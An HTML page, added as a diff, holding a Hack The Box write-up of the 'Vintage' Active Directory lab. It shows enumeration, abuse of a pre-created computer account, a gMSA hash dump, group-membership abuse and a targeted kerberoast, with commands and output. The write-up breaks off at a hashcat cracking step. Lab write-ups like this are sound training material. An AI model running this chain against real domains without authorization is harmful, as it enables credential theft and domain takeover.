@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Vintage | Paracausal Telemetry</title><meta name="description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Pre-created computer account, Dumping gMSA password of GMSA01$." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-vintage/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Vintage" /><meta property="og:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Pre-created computer account, Dumping gMSA password of GMSA01$." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-vintage/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-vintage/og.png?v=43c3a1b5" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Vintage" /><meta name="twitter:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Pre-created computer account, Dumping gMSA password of GMSA01$." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-vintage/og.png?v=43c3a1b5" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Vintage","description":"Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Pre-created computer account, Dumping gMSA password of GMSA01$.","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-vintage/","datePublished":"2026-04-06","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Vintage","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-vintage/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Vintage</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-04-06 · 14 min read</p><h1>Vintage</h1><p>Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Pre-created computer account, Dumping gMSA password of GMSA01$.</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · hard</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Vintage" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-vintage.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-vintage.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Vintage</h2><p>Vintage is a hard difficulty Windows machine designed around an assumed breach scenario, where the attacker is provided with low-privileged user credentials. The machine features an Active Directory environment without ADCS installed, and NTLM authentication is disabled. There…</p></div><span class="room-badge room-badge-hard">Hard</span></div><dl class="room-facts"><div><dt>Released</dt><dd>30 Nov 2024</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>Geiseric</dd></div><div><dt>Rating</dt><dd>4.8 / 5</dd></div><div><dt>User owns</dt><dd>2,666</dd></div><div><dt>Root owns</dt><dd>2,196</dd></div><div><dt>User blood</dt><dd>Embargo<small class="room-blood-time">1H 26M 17S</small></dd></div><div><dt>Root blood</dt><dd>kozmer<small class="room-blood-time">3H 16M 52S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 2772 votes from easiest to hardest"><rect x="0" y="61" width="20" height="3" rx="2" fill="hsl(96 70% 55%)"><title>41 votes</title></rect><rect x="26" y="62" width="20" height="2" rx="2" fill="hsl(96 70% 55%)"><title>11 votes</title></rect><rect x="52" y="60" width="20" height="4" rx="2" fill="hsl(80 70% 55%)"><title>60 votes</title></rect><rect x="78" y="56" width="20" height="8" rx="2" fill="hsl(70 70% 55%)"><title>124 votes</title></rect><rect x="104" y="48" width="20" height="16" rx="2" fill="hsl(50 70% 55%)"><title>259 votes</title></rect><rect x="130" y="40" width="20" height="24" rx="2" fill="hsl(38 70% 55%)"><title>397 votes</title></rect><rect x="156" y="0" width="20" height="64" rx="2" fill="hsl(28 70% 55%)"><title>1038 votes</title></rect><rect x="182" y="30" width="20" height="34" rx="2" fill="hsl(16 70% 55%)"><title>556 votes</title></rect><rect x="208" y="53" width="20" height="11" rx="2" fill="hsl(8 70% 55%)"><title>175 votes</title></rect><rect x="234" y="57" width="20" height="7" rx="2" fill="hsl(0 70% 55%)"><title>111 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 8.2, Real-Life 8.1, CVE 6.1, Custom Exploitation 3.9, CTF-Like 1.9"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,52.6 163.9,92.5 135.1,144.5 94.0,132.1 97.4,105.9" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Vintage" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Initial credentials</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">P.Rosa:Rosaisbest123</code></pre><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb 10.129.231.205 --generate-hosts-file /etc/hosts        
+[sudo] password for kali: 
+SMB         10.129.231.205  445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)</code></pre><p>So some things to note:</p><ul><li>NTLM auth disabled</li><li>SMB signing is enabled</li></ul><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT dc01.vintage.htb      
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-02 16:28 +0100
+Nmap scan report for dc01.vintage.htb (10.129.231.205)
+Host is up (0.014s latency).
+Not shown: 65516 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49664/tcp open  unknown
+49668/tcp open  unknown
+49676/tcp open  unknown
+49687/tcp open  unknown
+52792/tcp open  unknown
+62928/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 65.80 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -A --min-rate=2000 -sT dc01.vintage.htb
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-02 16:30 +0100
+Nmap scan report for dc01.vintage.htb (10.129.231.205)
+Host is up (0.017s latency).
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-02 15:30:36Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp open  mc-nmf        .NET Message Framing
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><p>DC is running at -1h</p><h2>SMB (445)</h2><p>Since NTLM is disabled i basically need to get a tgt</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.vintage.htb -u &#39;p.rosa&#39; -p &#39;Rosaisbest123&#39; -k            
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\p.rosa:Rosaisbest123</code></pre><p>The creds work to make this simple though ill just generate a tgt for this save entering credentials</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.vintage.htb -u &#39;p.rosa&#39; -p &#39;Rosaisbest123&#39; -k --generate-tgt p_rosa.tgt
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\p.rosa:Rosaisbest123 
+SMB         dc01.vintage.htb 445    dc01             [+] TGT saved to: p_rosa.tgt.ccache
+SMB         dc01.vintage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=p_rosa.tgt.ccache</code></pre><p>Now i can export it!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">export KRB5CCNAME=p_rosa.tgt.ccache</code></pre><h3>Shares</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.vintage.htb --use-kcache --shares                                      
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] VINTAGE.HTB\p.rosa from ccache 
+SMB         dc01.vintage.htb 445    dc01             [*] Enumerated shares
+SMB         dc01.vintage.htb 445    dc01             Share           Permissions     Remark
+SMB         dc01.vintage.htb 445    dc01             -----           -----------     ------
+SMB         dc01.vintage.htb 445    dc01             ADMIN$                          Remote Admin
+SMB         dc01.vintage.htb 445    dc01             C$                              Default share
+SMB         dc01.vintage.htb 445    dc01             IPC$            READ            Remote IPC
+SMB         dc01.vintage.htb 445    dc01             NETLOGON        READ            Logon server share 
+SMB         dc01.vintage.htb 445    dc01             SYSVOL          READ            Logon server share</code></pre><p>Read access on default shares</p><h3>Users</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.vintage.htb --use-kcache --users-export users.txt
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] VINTAGE.HTB\p.rosa from ccache 
+SMB         dc01.vintage.htb 445    dc01             -Username-                    -Last PW Set-       -BadPW- -Description-
+SMB         dc01.vintage.htb 445    dc01             Administrator                 2024-06-08 11:34:54 0       Built-in account for administering the computer/domain
+SMB         dc01.vintage.htb 445    dc01             Guest                         2024-11-13 14:16:53 0       Built-in account for guest access to the computer/domain
+SMB         dc01.vintage.htb 445    dc01             krbtgt                        2024-06-05 10:27:35 0       Key Distribution Center Service Account
+SMB         dc01.vintage.htb 445    dc01             M.Rossi                       2024-06-05 13:31:08 0        
+SMB         dc01.vintage.htb 445    dc01             R.Verdi                       2024-06-05 13:31:08 0        
+SMB         dc01.vintage.htb 445    dc01             L.Bianchi                     2024-06-05 13:31:08 0        
+SMB         dc01.vintage.htb 445    dc01             G.Viola                       2024-06-05 13:31:08 0        
+SMB         dc01.vintage.htb 445    dc01             C.Neri                        2024-06-05 21:08:13 0        
+SMB         dc01.vintage.htb 445    dc01             P.Rosa                        2024-11-06 12:27:16 0        
+SMB         dc01.vintage.htb 445    dc01             svc_sql                       2026-04-02 15:32:15 0        
+SMB         dc01.vintage.htb 445    dc01             svc_ldap                      2024-06-06 13:45:27 0        
+SMB         dc01.vintage.htb 445    dc01             svc_ark                       2024-06-06 13:45:27 0        
+SMB         dc01.vintage.htb 445    dc01             C.Neri_adm                    2024-06-07 10:54:14 0        
+SMB         dc01.vintage.htb 445    dc01             L.Bianchi_adm                 2024-11-26 11:40:30 0        
+SMB         dc01.vintage.htb 445    dc01             [*] Enumerated 14 local users: VINTAGE
+SMB         dc01.vintage.htb 445    dc01             [*] Writing 14 local users to users.txt</code></pre><p>Dumped all the users to a text file</p><p>AS-REP roasting and kerberoasting both failed</p><p>No usernames as passwords and no password reuse</p><p>Not a lot else i can do with SMB</p><h2>Pre-created computer account</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.vintage.htb -u &#39;fs01$&#39; -p &#39;fs01&#39; -k  
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\fs01$:fs01</code></pre><p>I ran nxc again with <code>--rid-brute</code> and found some machine accounts and ive attempted the user as password here and authenticated</p><h2>Bloodhound</h2><p><img src="images/vintage/pasted-image-20260406002240.webp" alt="Screenshot" loading="lazy" /> Found outbound object control on this machine account</p><h2>Dumping gMSA password of <code>GMSA01$</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap dc01.vintage.htb -u &#39;fs01$&#39; -p &#39;fs01&#39; --gmsa -k
+LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
+LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\fs01$:fs01 
+LDAP        dc01.vintage.htb 389    DC01             [*] Getting GMSA Passwords
+LDAP        dc01.vintage.htb 389    DC01             Account: gMSA01$              NTLM: 0851299c01b944d01099fc977eaa6c67     PrincipalsAllowedToReadPassword: Domain Computers</code></pre><p>Found the NTLM hash of this computer account</p><h2>Bloodhound on <code>GMSA01$</code></h2><p><img src="images/vintage/pasted-image-20260406002252.webp" alt="Screenshot" loading="lazy" /> Ive got GenericWrite and AddSelf on the service managers group</p><h2>Adding member to <code>servicemanagers</code> group</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.vintage.htb -u &#39;GMSA01$&#39; -H &#39;0851299c01b944d01099fc977eaa6c67&#39; --generate-tgt gmsa01 -k
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\GMSA01$:0851299c01b944d01099fc977eaa6c67 
+SMB         dc01.vintage.htb 445    dc01             [+] TGT saved to: gmsa01.ccache
+SMB         dc01.vintage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=gmsa01.ccache</code></pre><p>This generated a TGT for the GMSA01$ machine account</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">export KRB5CCNAME=gmsa01.ccache</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD -k --host dc01.vintage.htb -d vintage.htb add groupMember servicemanagers &#39;GMSA01$&#39; 
+[+] GMSA01$ added to servicemanagers</code></pre><p>I generated a TGT for the <code>GMSA01$</code> machine account and then added the user to the group</p><h2>Bloodhound on <code>servicemanagers</code> group</h2><p><img src="images/vintage/pasted-image-20260406002306.webp" alt="Screenshot" loading="lazy" /> GenericAll over three service accounts</p><p>The <code>svc_sql</code> account is disabled</p><h3>Re-enabling <code>svc_sql</code></h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.vintage.htb -u &#39;GMSA01$&#39; -H &#39;0851299c01b944d01099fc977eaa6c67&#39; --generate-tgt gmsa01 -k
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\GMSA01$:0851299c01b944d01099fc977eaa6c67 
+SMB         dc01.vintage.htb 445    dc01             [+] TGT saved to: gmsa01.ccache
+SMB         dc01.vintage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=gmsa01.ccache</code></pre><p>Im having to regenerate the TGT since i am now in a new group</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD -k --host dc01.vintage.htb -d vintage.htb remove uac &#39;svc_sql&#39; -f ACCOUNTDISABLE           
+
+[-] [&#39;ACCOUNTDISABLE&#39;] property flags removed from svc_sql&#39;s userAccountControl</code></pre><p>To do this i had to re-generate a TGT using nxc since the last one i generated does not contain the new group info</p><h2>Abusing GenericAll on three service accounts</h2><p>Now im in the group and have a valid TGT and <code>svc_sql</code> is enabled i can abuse this</p><p>So after trying to abuse ForceChangePassword on the three accounts and failing ill try a targeted kerberoast</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD -k --host dc01.vintage.htb -d vintage.htb set object &#39;svc_sql&#39; servicePrincipalName -v &#39;service/hacked&#39;
+
+[+] svc_sql&#39;s servicePrincipalName has been updated</code></pre><p>So for some reason when trying this on the the other two service accounts it failed and doesnt let me update the SPN</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap dc01.vintage.htb --use-kcache --kerberoasting kerb.hashes
+LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:VINTAGE.HTB) (signing:None) (channel binding:No TLS cert) (NTLM:False)
+LDAP        dc01.vintage.htb 389    DC01             [+] VINTAGE.HTB\p.rosa from ccache 
+LDAP        dc01.vintage.htb 389    DC01             [*] Skipping disabled account: krbtgt
+LDAP        dc01.vintage.htb 389    DC01             [*] Total of records returned 1
+LDAP        dc01.vintage.htb 389    DC01             [*] sAMAccountName: svc_sql, memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb, pwdLastSet: 2026-04-02 17:32:06.597110, lastLogon: &lt;never&gt;
+LDAP        dc01.vintage.htb 389    DC01             $krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb\svc_sql*$4d92468f4c7f369421448e16aa359808$2c7dfcda6f490ea1df70f69d453ca0ce321a160c4c5b2dce96b65036df0a98a9c7164d645d660d4d37d4350feac75f4c4ba309ed3d59298b08a7426f73dd13ddfde1e6117285099ee376c654e58d3ff3f75cc2590f3f89f54446eeddb7ca2f0276417150f6aa99dc052a9594e72d0da890eeb2aa548bdb8a8914e9c84d93bfe36fa0674d74e9b952623df4abcce82227cad06f4dfddabf34cfce4e21eb0225aa5715ed23ab50e28af75615440012cf7358b973c246489673ac166a50d3bbf826bcf498f446476e39ee314980b7d53ac18900536d67c9245549174b621c76cf617a4255c6c43ff901c4b18b79b94e7764e3bd2f0fe133d049147b5b36a3e6bcaa5da45a81c5a53171bba98e100f19376f229b1033ac946c29f3feaff7c7f83c69aefe9c323345a97050bccd441dcee2d72fdaf8d4e91f730bfc1eafa35462a322f6affb44982a828c3cf69eb150359dd8ded0bd27a468e90914aeae6fa37a3ca1353c4e7f47ab88db9268d2bb3da39bbd2fbd0fb5202187da503a0ed10a928fbb18c4cac0e89e486ef877f5c6ae53266d945bfe16b588bc521696e57bbd1d98241ea32517584adf68222694e2a6e0d44e749db873359bb7e23e91f295cf1e33d27cb5e5af7292bdaa64fda48ff1dd07bdab2a88b2646fb10549476b6c2158d8843cf8a929b72f63c0c6d9d07adf0bac74e0bddf544d7824b4cd82902ab9748e8c7fd8640bff5a8a3fca5fa7099324523afec5ce49c0c06acd0ddf78905858bad8588930c9d5c20e031707cf685148f380d5b02b35173e48a1e033aed299eac12bd6eed3a68082579384e0164ad3620f09f286fe225aa2a2a8fe6afbbef3437f8151fadefdc231d4b00243e805045b9df532236617ae118dbc1cf21612b0a0a76979f5ed5cbcd78c1eb45983904704e8cb5dd7aecb7891345726aebe1cf5ec8fa7e3fb8b42063df2ff3f14d092f60cec4bc24fcf323b9ce6f30e3f6451530477a9faabed1a00df6f969aeca1e96e01a2715b91d6b0661bdfe37d5191049fc3e99db8d99ae249350adf6fd2188b69feb15591071caddc45438b901a0fabe2a47dfe3836db0e643245be93f79eee068d7f18ddf1f271ab468f360a6749136c8c9c665c3e14f8f240b89f77504d5702f2a26c6ca5ac6c34e29778a6a13058753fc4a608958a8a89d3e6fe70c8f89b1fcd0fe891a3d9b1d7336ed1e1ba78e0eaa5544c8ecad11c3151a94efa621ced40467de08fa167d5eecb8cab97dbe61f2bfb074828b33ed63211629df7687ac6245f1e4e7d7f39a7e1935d1a6393e4f1076c6b30d1bd7ad5c83116775aad736e4a00bf1b93dcfa9cdb1469a08823640e07e9317b3dfe8377d9f9785889067bf7fdf01b6d2bc54dc863d1b032b25b1c02db2f01d1400957628e6c68669752415bd50f95a37defffe5cc5da79eb34a</code></pre><p>Ive got a hash!</p><h3>Cracking the hash</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">hashcat kerb.hashes /usr/share/wordlists/rockyou.txt
+
